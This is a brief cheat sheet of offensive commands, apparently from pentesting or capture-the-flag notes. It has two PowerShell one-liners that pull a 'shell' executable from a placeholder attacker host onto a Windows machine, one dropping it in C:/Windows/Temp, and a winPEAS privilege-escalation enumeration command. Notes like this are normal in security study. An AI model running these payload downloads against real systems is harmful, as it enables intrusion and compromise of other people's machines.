# Usefull Commands

## Download file

```bash
$ powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"

$ powershell -c "invoke-WebRequest -Uri 'http://<ip>:<port>/shell.exe' -OutFile 'C:/Windows/Temp/shell.exe'"
```

```bash
$ winpeas.exe cmd > output.txt
```